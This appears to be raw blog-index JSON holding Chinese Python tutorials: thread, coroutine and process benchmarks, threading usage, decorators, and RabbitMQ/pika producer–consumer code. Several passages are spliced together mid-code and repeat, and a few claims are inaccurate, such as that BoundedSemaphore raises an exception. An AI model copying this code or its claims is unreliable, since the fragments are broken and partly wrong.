str(t4-t2)\n```\n测试结果：\n访问10次\ngevent-time:0.380326032639\nthread-time:0.376606941223\n访问50次\ngevent-time:1.3358900547\nthread-time:1.59564089775\n访问100次\ngevent-time:2.42984986305\nthread-time:2.5669670105\n访问300次\ngevent-time:6.66330099106\nthread-time:10.7605059147\n从结果可以看出，当并发数不断增大时，协程的效率确实比多线程要高，但在并发数不是那么高时，两者差异不大。\n#### CPU密集型\nCPU密集型，我选择科学计算的一些功能，计算所需时间。（主要测试单线程、多线程、协程、多进程）\n测试代码：\n```bash\n#! -*- coding:utf-8 -*-\n\nfrom multiprocessing import Process as pro\nfrom multiprocessing.dummy import Process as thr\nfrom gevent import monkey;monkey.patch_all()\nimport gevent\n\ndef run(i):\n\tlists=range(i)\n\tlist(set(lists))\n\t\nif __name__==\"__main__\":\n\t'''\n\t多进程\n\t'''\n\tfor i in range(30):      ##10-2.1s 20-3.8s 30-5.9s\n\t\tt=pro(target=run,args=(5000000,))\n\t\tt.start()\n\n\t'''\n\t多线程\n\t'''\n\t# for i in range(30):    ##10-3.8s  20-7.6s  30-11.4s\n\t# \tt=thr(target=run,args=(5000000,))\n\t# \tt.start()\n\n\t'''\n\t协程\n\t'''\n\t# jobs=[gevent.spawn(run,5000000) for i in range(30)]  ##10-4.0s 20-7.7s 30-11.5s\n\t# gevent.joinall(jobs)\n\t# for i in jobs:\n\t# \ti.join()\n\n\t'''\n\t单线程\n\t'''\n\t# for i in range(30):  ##10-3.5s  20-7.6s 30-11.3s\n\t# \trun(5000000)\n```\n测试结果：\n\n* 并发10次：【多进程】2.1s   【多线程】3.8s   【协程】4.0s  【单线程】3.5s\n* 并发20次：【多进程】3.8s   【多线程】7.6s   【协程】7.7s  【单线程】7.6s\n* 并发30次：【多进程】5.9s   【多线程】11.4s  【协程】11.5s 【单线程】11.3s \n\n　　可以看到，在CPU密集型的测试下，多进程效果明显比其他的好，多线程、协程与单线程效果差不多。这是因为只有多进程完全使用了CPU的计算能力。在代码运行时，我们也能够看到，只有多进程可以将CPU使用率占满。\n\n### 本文结论\n　　从两组数据我们不难发现，python多线程并没有那么鸡肋。如若不然，Python3为何不去除GIL呢？对于此问题，Python社区也有两派意见，这里不再论述，我们应该尊重Python之父的决定。\n　　至于何时该用多线程，何时用多进程，何时用协程？想必答案已经很明显了。\n　　当我们需要编写并发爬虫等IO密集型的程序时，应该选用多线程或者协程（亲测差距不是特别明显）；当我们需要科学计算，设计CPU密集型程序，应该选用多进程。当然以上结论的前提是，不做分布式，只在一台服务器上测试。\n　　答案已经给出，本文是否就此收尾？既然已经论述Python多线程尚有用武之地，那么就来介绍介绍其用法吧。\n### Multiprocessing.dummy模块\nMultiprocessing.dummy用法与多进程Multiprocessing用法类似，只是在import包的时候，加上.dummy。\n用法参考[Multiprocessing用法](http://thief.one/2016/11/23/Python-multiprocessing/)\n### threading模块\n　　这是python自带的threading多线程模块，其创建多线程主要有2种方式。一种为继承threading类，另一种使用threading.Thread函数，接下来将会分别介绍这两种用法。\n#### Usage【1】\n利用threading.Thread()函数创建线程。\n代码：\n```bash\ndef run(i):\n\tprint i\n\nfor i in range(10):\n\tt=threading.Thread(target=run,args=(i,))\n\tt.start()\n```\n　　说明：Thread()函数有2个参数，一个是target，内容为子线程要执行的函数名称；另一个是args，内容为需要传递的参数。创建完子线程，将会返回一个对象，调用对象的start方法，可以启动子线程。\n\n线程对象的方法：\n* Start()                                 开始线程的执行\n* Run()                                  定义线程的功能的函数\n* Join(timeout=None)           程序挂起，直到线程结束；如果给了timeout，则最多阻塞timeout秒\n* getName()                          返回线程的名字\n* setName()                           设置线程的名字\n* isAlive()                               布尔标志，表示这个线程是否还在运行\n* isDaemon()                         返回线程的daemon标志\n* setDaemon(daemonic)        把线程的daemon标志设为daemonic（一定要在start（）函数前调用）\n* t.setDaemon(True)               把父线程设置为守护线程，当父进程结束时，子进程也结束。\n\nthreading类的方法：\n* threading.enumerate()        正在运行的线程数量\n\n#### Usage【2】\n通过继承threading类，创建线程。\n代码：\n```bash\nimport threading\n\nclass test(threading.Thread):\n    def __init__(self):\n        threading.Thread.__init__(self)\n\n    def run(self):\n        try:\n            print \"code one\"\n        except:\n            pass\n\nfor i in range(10):\n    cur=test()\n    cur.start()\nfor i in range(10):\n    cur.join()\n```\n说明：此方法继承了threading类，并且重构了run函数功能。\n\n### 获取线程返回值问题\n　　有时候，我们往往需要获取每个子线程的返回值。然而通过调用普通函数，获取return值的方式在多线程中并不适用。因此需要一种新的方式去获取子线程返回值。\n代码：\n```bash\nimport threading\n\nclass test(threading.Thread):\n    def __init__(self):\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.tag=1\n\n    def get_result(self):\n        if self.tag==1:\n            return True\n        else:\n            return False\n\nf=test()\nf.start()\nwhile f.isAlive():\n    continue\nprint f.get_result()\n```\n　　说明：多线程获取返回值的首要问题，就是子线程什么时候结束？我们应该什么时候去获取返回值？可以使用isAlive()方法判断子线程是否存活。\n\n### 控制线程运行数目\n当需要执行的任务非常多时，我们往往需要控制线程的数量，threading类自带有控制线程数量的方法。\n代码：\n```bash\nimport threading\n\nmaxs=10  ##并发的线程数量\nthreadLimiter=threading.BoundedSemaphore(maxs)\nclass test(threading.Thread):\n    def __init__(self):\n        threading.Thread.__init__(self)\n\n    def run(self):\n        threadLimiter.acquire()  #获取\n        try:\n            print \"code one\"\n        except:\n            pass\n        finally:\n            threadLimiter.release() #释放\n\nfor i in range(100):\n    cur=test()\n    cur.start()\nfor i in range(100):\n    cur.join()\n```\n说明：以上程序可以控制多线程并发数为10，超过这个数量会引发异常。\n除了自带的方法，我们还可以设计其他方案：\n```bash\nthreads=[]\n'''\n创建所有线程\n'''\nfor i in range(10):\n\tt=threading.Thread(target=run,args=(i,))\n\tthreads.append(t)\n'''\n启动列表中的线程\n'''\nfor t in threads:\n    t.start()\n    while True:\n        #判断正在运行的线程数量,如果小于5则退出while循环,\n        #进入for循环启动新的进程.否则就一直在while循环进入死循环\n        if(len(threading.enumerate())<5):\n            break\n```\n以上两种方式皆可以，本人更喜欢用下面那种方式。\n\n### 线程池\n```bash\nimport threadpool\ndef ThreadFun(arg1,arg2):\n    pass\ndef main():\n    device_list=[object1,object2,object3......,objectn]#需要处理的设备个数\n    task_pool=threadpool.ThreadPool(8)#8是线程池中线程的个数\n    request_list=[]#存放任务列表\n    #首先构造任务列表\n    for device in device_list:\n        request_list.append(threadpool.makeRequests(ThreadFun,[((device, ), {})]))\n    #将每个任务放到线程池中，等待线程池中线程各自读取任务，然后进行处理，使用了map函数，不了解的可以去了解一下。\n    map(task_pool.putRequest,request_list)\n    #等待所有任务处理完成，则返回，如果没有处理完，则一直阻塞\n    task_pool.poll()\nif __name__==\"__main__\":\n    main()\n\n```\n\n*多进程问题，可以赶赴[Python多进程](http://thief.one/2016/11/23/Python-multiprocessing/)现场，其他关于多线程问题，可以下方留言讨论*\n\n\n申明：本文谈不上原创，其中借鉴了网上很多大牛的文章，本人只是在此测试论述Python多线程相关问题，并简单介绍Python多线程的基本用法，为新手朋友解惑。\n","source":"_posts/Python多线程鸡年不鸡肋.md","raw":"---\ntitle: Python多线程鸡年不鸡肋\ndate: 2017-02-17 13:22:14\ncomments: true\ntags: \n- python\n- 多线程\ncategories: 编程之道\n---\n<blockquote class=\"blockquote-center\">术业有专攻，如是而已</blockquote>\n当初在刚学习python多线程时，上网搜索资料几乎都是一片倒的反应python没有真正意义上的多线程，python多线程就是鸡肋。当时不明所以，只是了解到python带有GIL解释器锁的概念，同一时刻只能有一个线程在运行，遇到IO操作才会释放切换。那么，python多线程是否真的很鸡肋呢？要解决这个疑惑，我想必须亲自动手测试。\n<!--more -->\n　　经过对比python与java的多线程测试，我发现python多线程的效率确实不如java，但远还没有达到鸡肋的程度，那么跟其他机制相比较呢？\n### 观点：用多进程替代多线程需求\n　　辗转了多篇博文，我看到了一些网友的观点，觉得应该使用python多进程来代替多线程的需求，因为多进程不受GIL的限制。于是我便动手使用多进程去解决一些并发问题，期间也遇到了一些坑，所幸大部分查找资料解决了，然后对多进程做了简单汇总介绍[Python多进程](http://thief.one/2016/11/23/Python-multiprocessing/)。\n　　那么是否多进程能完全替代多线程呢？别急，我们继续往下看。\n### 观点：协程为最佳方案\n　　协程的概念目前来说是比较火热的，协程不同于线程的地方在于协程不是操作系统进行切换，而是由程序员编码进行切换的，也就是说切换是由程序员控制的，这样就没有了线程所谓的安全问题。协程的概念非常广而深，本文暂不做具体介绍，以后会单独成文。\n### 测试数据\n　　好了，网上的观点无非是使用多进程或者协程来代替多线程（当然换编程语言，换解释器之类方法除外），那么我们就来测试下这三者的性能之差。既然要公平测试，就应该考虑IO密集型与CPU密集型的问题，所以分两组数据进行测试。\n#### IO密集型测试\n　　测试IO密集型，我选择最常用的爬虫功能，计算爬虫访问bing所需要的时间。（主要测试多线程与协程，单线程与多进程就不测了，因为没有必要）\n测试代码：\n```bash\n#! -*- coding:utf-8 -*-\n\nfrom gevent import monkey;monkey.patch_all()\nimport gevent\nimport time\nimport threading\nimport urllib2\n\ndef urllib2_(url):\n\ttry:\n\t\turllib2.urlopen(url,timeout=10).read()\n\texcept Exception,e:\n\t\tprint e\n\ndef gevent_(urls):\n\tjobs=[gevent.spawn(urllib2_,url) for url in urls]\n\tgevent.joinall(jobs,timeout=10)\n\tfor i in jobs:\n\t\ti.join()\n\ndef thread_(urls):\n\ta=[]\n\tfor url in urls:\n\t\tt=threading.Thread(target=urllib2_,args=(url,))\n\t\ta.append(t)\n\n\tfor i in a:\n\t\ti.start()\n\tfor i in a:\n\t\ti.join()\n\nif __name__==\"__main__\":\n\turls=[\"https://www.bing.com/\"]*10      \n\tt1=time.time()\n\tgevent_(urls)\n\tt2=time.time()\n\tprint 'gevent-time:%s' % str(t2-t1)\n\tthread_(urls)\n\tt4=time.time()\n\tprint 'thread-time:%s' % str(t4-t2)\n```\n测试结果：\n访问10次\ngevent-time:0.380326032639\nthread-time:0.376606941223\n访问50次\ngevent-time:1.3358900547\nthread-time:1.59564089775\n访问100次\ngevent-time:2.42984986305\nthread-time:2.5669670105\n访问300次\ngevent-time:6.66330099106\nthread-time:10.7605059147\n从结果可以看出，当并发数不断增大时，协程的效率确实比多线程要高，但在并发数不是那么高时，两者差异不大。\n#### CPU密集型\nCPU密集型，我选择科学计算的一些功能，计算所需时间。（主要测试单线程、多线程、协程、多进程）\n测试代码：\n```bash\n#! -*- coding:utf-8 -*-\n\nfrom multiprocessing import Process as pro\nfrom multiprocessing.dummy import Process as thr\nfrom gevent import monkey;monkey.patch_all()\nimport gevent\n\ndef run(i):\n\tlists=range(i)\n\tlist(set(lists))\n\t\nif __name__==\"__main__\":\n\t'''\n\t多进程\n\t'''\n\tfor i in range(30):      ##10-2.1s 20-3.8s 30-5.9s\n\t\tt=pro(target=run,args=(5000000,))\n\t\tt.start()\n\n\t'''\n\t多线程\n\t'''\n\t# for i in range(30):    ##10-3.8s  20-7.6s  30-11.4s\n\t# \tt=thr(target=run,args=(5000000,))\n\t# \tt.start()\n\n\t'''\n\t协程\n\t'''\n\t# jobs=[gevent.spawn(run,5000000) for i in range(30)]  ##10-4.0s 20-7.7s 30-11.5s\n\t# gevent.joinall(jobs)\n\t# for i in jobs:\n\t# \ti.join()\n\n\t'''\n\t单线程\n\t'''\n\t# for i in range(30):  ##10-3.5s  20-7.6s 30-11.3s\n\t# \trun(5000000)\n```\n测试结果：\n\n* 并发10次：【多进程】2.1s   【多线程】3.8s   【协程】4.0s  【单线程】3.5s\n* 并发20次：【多进程】3.8s   【多线程】7.6s   【协程】7.7s  【单线程】7.6s\n* 并发30次：【多进程】5.9s   【多线程】11.4s  【协程】11.5s 【单线程】11.3s \n\n　　可以看到，在CPU密集型的测试下，多进程效果明显比其他的好，多线程、协程与单线程效果差不多。这是因为只有多进程完全使用了CPU的计算能力。在代码运行时，我们也能够看到，只有多进程可以将CPU使用率占满。\n\n### 本文结论\n　　从两组数据我们不难发现，python多线程并没有那么鸡肋。如若不然，Python3为何不去除GIL呢？对于此问题，Python社区也有两派意见，这里不再论述，我们应该尊重Python之父的决定。\n　　至于何时该用多线程，何时用多进程，何时用协程？想必答案已经很明显了。\n　　当我们需要编写并发爬虫等IO密集型的程序时，应该选用多线程或者协程（亲测差距不是特别明显）；当我们需要科学计算，设计CPU密集型程序，应该选用多进程。当然以上结论的前提是，不做分布式，只在一台服务器上测试。\n　　答案已经给出，本文是否就此收尾？既然已经论述Python多线程尚有用武之地，那么就来介绍介绍其用法吧。\n### Multiprocessing.dummy模块\nMultiprocessing.dummy用法与多进程Multiprocessing用法类似，只是在import包的时候，加上.dummy。\n用法参考[Multiprocessing用法](http://thief.one/2016/11/23/Python-multiprocessing/)\n### threading模块\n　　这是python自带的threading多线程模块，其创建多线程主要有2种方式。一种为继承threading类，另一种使用threading.Thread函数，接下来将会分别介绍这两种用法。\n#### Usage【1】\n利用threading.Thread()函数创建线程。\n代码：\n```bash\ndef run(i):\n\tprint i\n\nfor i in range(10):\n\tt=threading.Thread(target=run,args=(i,))\n\tt.start()\n```\n　　说明：Thread()函数有2个参数，一个是target，内容为子线程要执行的函数名称；另一个是args，内容为需要传递的参数。创建完子线程，将会返回一个对象，调用对象的start方法，可以启动子线程。\n\n线程对象的方法：\n* Start()                                 开始线程的执行\n* Run()                                  定义线程的功能的函数\n* Join(timeout=None)           程序挂起，直到线程结束；如果给了timeout，则最多阻塞timeout秒\n* getName()                          返回线程的名字\n* setName()                           设置线程的名字\n* isAlive()                               布尔标志，表示这个线程是否还在运行\n* isDaemon()                         返回线程的daemon标志\n* setDaemon(daemonic)        把线程的daemon标志设为daemonic（一定要在start（）函数前调用）\n* t.setDaemon(True)               把父线程设置为守护线程，当父进程结束时，子进程也结束。\n\nthreading类的方法：\n* threading.enumerate()        正在运行的线程数量\n\n#### Usage【2】\n通过继承threading类，创建线程。\n代码：\n```bash\nimport threading\n\nclass test(threading.Thread):\n    def __init__(self):\n        threading.Thread.__init__(self)\n\n    def run(self):\n        try:\n            print \"code one\"\n        except:\n            pass\n\nfor i in range(10):\n    cur=test()\n    cur.start()\nfor i in range(10):\n    cur.join()\n```\n说明：此方法继承了threading类，并且重构了run函数功能。\n\n### 获取线程返回值问题\n　　有时候，我们往往需要获取每个子线程的返回值。然而通过调用普通函数，获取return值的方式在多线程中并不适用。因此需要一种新的方式去获取子线程返回值。\n代码：\n```bash\nimport threading\n\nclass

return True\n        else:\n            return False\n\nf=test()\nf.start()\nwhile f.isAlive():\n    continue\nprint f.get_result()\n```\n　　说明：多线程获取返回值的首要问题，就是子线程什么时候结束？我们应该什么时候去获取返回值？可以使用isAlive()方法判断子线程是否存活。\n\n### 控制线程运行数目\n当需要执行的任务非常多时，我们往往需要控制线程的数量，threading类自带有控制线程数量的方法。\n代码：\n```bash\nimport threading\n\nmaxs=10  ##并发的线程数量\nthreadLimiter=threading.BoundedSemaphore(maxs)\nclass test(threading.Thread):\n    def __init__(self):\n        threading.Thread.__init__(self)\n\n    def run(self):\n        threadLimiter.acquire()  #获取\n        try:\n            print \"code one\"\n        except:\n            pass\n        finally:\n            threadLimiter.release() #释放\n\nfor i in range(100):\n    cur=test()\n    cur.start()\nfor i in range(100):\n    cur.join()\n```\n说明：以上程序可以控制多线程并发数为10，超过这个数量会引发异常。\n除了自带的方法，我们还可以设计其他方案：\n```bash\nthreads=[]\n'''\n创建所有线程\n'''\nfor i in range(10):\n\tt=threading.Thread(target=run,args=(i,))\n\tthreads.append(t)\n'''\n启动列表中的线程\n'''\nfor t in threads:\n    t.start()\n    while True:\n        #判断正在运行的线程数量,如果小于5则退出while循环,\n        #进入for循环启动新的进程.否则就一直在while循环进入死循环\n        if(len(threading.enumerate())<5):\n            break\n```\n以上两种方式皆可以，本人更喜欢用下面那种方式。\n\n### 线程池\n```bash\nimport threadpool\ndef ThreadFun(arg1,arg2):\n

class=\"blockquote-center\">种一棵树最好的时间是十年前，其次是现在!</blockquote>\n　　作为一个脚本小子，平日里写惯了脚本，不太习惯编写项目型的代码。然而报着提升代码质量、提高编码能力的态度，最近开始尝试学习一些编程高级用法，本章用于记录关于python装饰器的一些基础用法，欢迎纠错。\n<!--more -->\n　　装饰模式有很多经典的使用场景，例如插入日志、性能测试、事务处理等等，有了装饰器，就可以提取大量函数中与本身功能无关的类似代码，从而达到代码重用的目的。简单来说，装饰器的特点就是接收函数作为参数，然后返回函数。\n\n### 入门\n```bash\ndef log(func):\n    def wrapper(*args, **kw):\n        print 'call %s():' % func.__name__\n        return func(*args, **kw)\n    return wrapper\n@log  #now = log(now)\ndef now():\n    print '2013-12-25'\n```\n运行：\n```bash\n>>> now()\ncall now():\n2013-12-25\n```\n执行流程说明：\n>@log相当于now=log(now)，原来的now函数还在，只是现在now变量指向了新函数。因此当我们运行now()时，并不是运行now函数，而是运行log(now)返回的函数，即warpper函数。运行warpper函数后，会输出call....，然后执行func(*args,**kwargs)，而func就是传入的函数now，因此就是执行now函数，即now(*args,*kwargs),输入2013-12-25，从而达到了不必修改now函数，在执行now函数前输出内容。\n\n### 进阶\n```bash\n#! -*- coding:utf-8 -*-\n\nimport functools\n\ndef log(*args):\n     if len(args)>0:\n          text=args[0]\n     else:\n          text=\"\"\n     def a(func):\n          @functools.wraps(func)  #run函数属性赋值给b函数，如果不写，则最后run.__name__输出的应该是b，而不是run\n          def b(*args,**kwargs):\n               print \"begin start\",text #执行run函数前的输出\n

\".*\"\n```\n### Client Usage\n接下来可以在两台不同的PC上，运行两段代码，一段用来向rabbitmq队列中发送消息，另一段用来获取消息。\n#### rabbitmq for python\npython中来用连接操作rabbitmq服务的库有pika、txAMQP、py-amqplib，celery等，这里主要介绍下pika。\n\n### Rabbitmq+pika\npika是python中用来连接rabbitmq服务端的第三方库。\npika文档：http://pika.readthedocs.io/en/latest/examples/blocking_consume.html\n\n#### 安装pika\n```bash\npip install pika\n```\n#### pika Usage\n先搭建一个rabbitmq服务器用来存储消息队列，然后利用pika来存放获取队列中的任务，pika分为生产者与消费者模式.\n##### 生产者代码\n```bash\nimport pika\n'''\n生产者模式代码，向rabbitmq消息队列中存放消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')#申明hello队列，如果该队列不存在，则自动创建。\n\n#发送消息到hello队列中，若队列不存在，则自动清除这些消息。\nchannel.basic_publish(exchange='', routing_key='hello', body='Hello World!')\n#exchange表示交换器，能精确指定消息应该发送到哪个队列,routing_key设置为队列的名称，body就是消息内容。\nprint \" [x] Sent 'Hello World!'\"\nconnection.close() #关闭连接\n'''\nrabbitmq服务器可以用rabbitmqctl list_queues来查看队列情况\n'''\n```\n##### 消费者代码\n```bash\nimport pika\n'''\n消费者模式代码，从rabbitmq消息队列中取出消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')\n\n#定义回调函数来处理接受到的消息\ndef callback(ch, method, properties, body):\n    print \" [x] Received %r\" % (body,)\n\n#告诉rabbitmq使用callback来接受消息\nchannel.basic_consume(callback, queue='hello', no_ack=True)\nprint ' [*] Waiting for messages. To exit press CTRL+C'\n#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。\nchannel.start_consuming()\n```\n以上两段代码为最简单的生产者与消费者，没有涉及到持久化存储以及消息返回等内容。\n\n#### 消息确认\n当一个正在执行的消费者中断了，则需要返回消息，告诉rabbitmq重新将其分配给其他消费者。\n```bash\ndef callback(ch, method, properties, body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(5)\n    print \" [x] Done\"\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n```\n或者可以这样:\n```bash\nchannel.basic_consume(callback, queue='hello', no_ack=False)\n```\n　　如果消息不确认，rabbitmq默认是没有超时时间的概念，即只要客户端连接不中断就会一直等待ack确认消息，那么此任务将会阻塞。针对这种情况，我们可以在程序中手动确认消息，即利用上面的代码。但如果程序在运行过程中出错，我们必须将此任务重新放回队列重新取出执行，则要用到channel.basic_nack(delivery_tag = method.delivery_tag)方法，可以实现将任务重新放回队列。\n#### 消息持久化存储\n　　虽然有了消息反馈机制，但是如果rabbitmq自身挂掉的话，那么任务还是会丢失。所以需要将任务持久化存储起来。\n```bash\nchannel.queue_declare(queue='hello', durable=True)\n但是这个程序会执行错误，因为hello这个队列已经存在，并且是非持久化的，rabbitmq不允许使用不同的参数来重新定义存在的队列。重新定义一个队列：\nchannel.queue_declare(queue='task_queue', durable=True)\n在发送任务的时候，用delivery_mode=2来标记任务为持久化存储：\nchannel.basic_publish(exchange='',\n                      routing_key=\"task_queue\",\n                      body=message,\n                      properties=pika.BasicProperties(\n                         delivery_mode = 2, # make message persistent\n                      ))\n```\n#### 公平调度\n　　上面实例中，虽然每个工作者是依次分配到任务，但是每个任务不一定一样。可能有的任务比较重，执行时间比较久；有的任务比较轻，执行时间比较短。如果能公平调度就最好了，使用basic_qos设置prefetch_count=1，使得rabbitmq不会在同一时间给工作者分配多个任务，即只有工作者完成任务之后，才会再次接收到任务。\n```bash\nchannel.basic_qos(prefetch_count=1)\n```\n### pika vs celery\n　　celery用来分配任务的，主要是做异步任务队列的。\n　　pika+rabbitmq主要是用来消息的收发功能，并不带有任务分配功能。比如说我们有很多台机器需要去rabbitmq服务器消息队列中取任务，任务怎么分配，pika应该做不到。pika只能做到消息的发送，以及消息的获取。又或者说pika其实就是用来使用rabbitmq的一个客户端，本身只是消息存储功能，并没有任务的分配等。如果需要此功能，就需要理由pika模块自己写一个调度方案，相当于自己写一个celery模块。\n\n### Rabbitmq任务调度问题\n首先，Rabbitmq任务调度应该是阻塞的，看代码：\n```bash\nimport pika\nimport time\n'''\n消费者模式代码，从rabbitmq消息队列中取出消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')\n\n#定义回调函数来处理接受到的消息\ndef callback(ch, method, properties, body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    #ch.basic_ack(delivery_tag = method.delivery_tag) ##消息确认，告诉队列这个任务做完了\n\n#告诉rabbitmq使用callback来接受消息\nchannel.basic_qos(prefetch_count=10) #最多只会让消费者同时做10个任务\nchannel.basic_consume(callback, queue='hello')\nprint ' [*] Waiting for messages. To exit press CTRL+C'\n#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。\nchannel.start_consuming()\n```\n运行结果：每隔1s输出一个hello world，输出10个后停止。\n\n　　我们把ch.basic_ack(delivery_tag = method.delivery_tag)注释去掉，再运行.\n　　每隔1s输出一个hello world ，不会停止。可以看到的是prefetch_count=10，也就是说可以同时执行10个任务，然而结果是并没有并发执行，而是单线程执行的，也就是说是一个任务一个任务执行的。\n　　ch.basic_ack(delivery_tag = method.delivery_tag)的作用在于告诉队列，单个任务已经执行完，也就是说如果不回复，那么队列认为此任务还没做完，累计到10个任务后，达到了同时执行的最大任务量，因此便不会再下派任务。\n\n　　那么加上消息确认，为何也没有达到10个任务并发执行呢？\n\n　　我的猜想是，rabbitmq本身并不是异步的（是阻塞的），也没有并发的功能，想要实现并发，需要自己写程序解决。修改代码，我们再看看.\n```bash\nimport pika\nimport time\nimport threading\n'''\n消费者模式代码，从rabbitmq消息队列中取出消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag) ##消息确认，告诉队列这个任务做完了\n\n#定义回调函数来处理接受到的消息\ndef callback(ch, method, properties, body):\n    t=threading.Thread(target=test,args=(ch,method,body)) #多线程\n    t.start()\n\n#告诉rabbitmq使用callback来接受消息\nchannel.basic_qos(prefetch_count=2) #最多只会让消费者同时做10个任务\nchannel.basic_consume(callback, queue='hello')\nprint ' [*] Waiting for messages. To exit press CTRL+C'\n#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。\nchannel.start_consuming()\n```\n运行结果：每隔1s，并发输出2个hello world，确实达到了并发的效果，然后并发的数量取决于prefetch_count=2的设置。\n\n　　那么我们可以得出结论，从rabbitmq队列取出数据本身是阻塞的，没有达到并发，但是通过设置prefetch_count=2以及编写多线程函数，还是可以达到并发的效果。（prefetch_count 不设置，默认应该是没有上限）\n\n### Rabbitmq并发调度问题\nRabbitmq取任务本身不是并发的，但可以结合多线程、协程、多进程达到并发的效果。\n\n@更新于2017年5月9日：\n*以下并发方式并不适用于pika，因为其在一个blocking_connection中不支持并发，这里当做错误示范保留。如果需要并发，可以把多线程写在每个连接外面，即每个线程都去连接队列，达到并发收取队列任务的效果。*\n\n#### 多线程\n代码：\n```bash\nimport pika\nimport time\nimport threading\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))\nchannel = connection.channel()\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n\ndef callback(ch, method, properties, body):\n    t=threading.Thread(target=test,args=(ch,method,body))\n    t.start()\n\nchannel.basic_qos(prefetch_count=2)\nchannel.basic_consume(callback, queue='hello')\nchannel.start_consuming()\n```\n　　代码中定义的回调函数是一个多线程启动器，任务发给回调函数，回调函数会将它以多线程的形式传递给test函数，执行输出。并发的数量取决于prefetch_count=2，这代表同时执行任务的最大数量。\n\n#### 协程\n代码：\n```bash\nimport pika\nimport time\nimport gevent\nfrom gevent import monkey;monkey.patch_all()\n\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))\nchannel = connection.channel()\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n\ndef callback(ch, method, properties, body):\n    gevent.spawn(test,ch,method,body) #协程启动，没有调用join，因为rabbitmq本身是阻塞的,可以不用join\n\nchannel.basic_qos(prefetch_count=2) #并发的数量\nchannel.basic_consume(callback, queue='hello')\nchannel.start_consuming()\n```\n#### 多进程\n代码：（只能在linux下使用）\n```bash\nimport pika\nimport time\nfrom multiprocessing import Process\n\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2'))\nchannel = connection.channel()\nchannel.queue_declare(queue='hello')\n\ndef test(ch,method,body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(1)\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n\ndef callback(ch, method, properties, body):\n    t=Process(target=test,args=(ch,method,body))\n    t.start()\n\nchannel.basic_qos(prefetch_count=2) #并发的进程数量\nchannel.basic_consume(callback, queue='hello')\nchannel.start_consuming()\n```\n\n*本文所写内容，均为本人测试后所得，如有错误，欢迎指正，谢谢！*\n\n>转载请说明出处:[RabbitMQ |

Rabbitmq+pika\npika是python中用来连接rabbitmq服务端的第三方库。\npika文档：http://pika.readthedocs.io/en/latest/examples/blocking_consume.html\n\n#### 安装pika\n```bash\npip install pika\n```\n#### pika Usage\n先搭建一个rabbitmq服务器用来存储消息队列，然后利用pika来存放获取队列中的任务，pika分为生产者与消费者模式.\n##### 生产者代码\n```bash\nimport pika\n'''\n生产者模式代码，向rabbitmq消息队列中存放消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')#申明hello队列，如果该队列不存在，则自动创建。\n\n#发送消息到hello队列中，若队列不存在，则自动清除这些消息。\nchannel.basic_publish(exchange='', routing_key='hello', body='Hello World!')\n#exchange表示交换器，能精确指定消息应该发送到哪个队列,routing_key设置为队列的名称，body就是消息内容。\nprint \" [x] Sent 'Hello World!'\"\nconnection.close() #关闭连接\n'''\nrabbitmq服务器可以用rabbitmqctl list_queues来查看队列情况\n'''\n```\n##### 消费者代码\n```bash\nimport pika\n'''\n消费者模式代码，从rabbitmq消息队列中取出消息（任务）\n'''\nconnection = pika.BlockingConnection(pika.ConnectionParameters('172.16.1.2')) #链接rabbitmq服务器,端口可以不写。\nchannel = connection.channel()\n\n#声明消息队列，消息将在这个队列中进行传递。\nchannel.queue_declare(queue='hello')\n\n#定义回调函数来处理接受到的消息\ndef callback(ch, method, properties, body):\n    print \" [x] Received %r\" % (body,)\n\n#告诉rabbitmq使用callback来接受消息\nchannel.basic_consume(callback, queue='hello', no_ack=True)\nprint ' [*] Waiting for messages. To exit press CTRL+C'\n#开始接受消息，并进入阻塞状态，队列里有消息才会调用callback进行处理，按ctrl+c退出。\nchannel.start_consuming()\n```\n以上两段代码为最简单的生产者与消费者，没有涉及到持久化存储以及消息返回等内容。\n\n#### 消息确认\n当一个正在执行的消费者中断了，则需要返回消息，告诉rabbitmq重新将其分配给其他消费者。\n```bash\ndef callback(ch, method, properties, body):\n    print \" [x] Received %r\" % (body,)\n    time.sleep(5)\n    print \" [x] Done\"\n    ch.basic_ack(delivery_tag = method.delivery_tag)\n```\n或者可以这样:\n```bash\nchannel.basic_consume(callback, queue='hello', 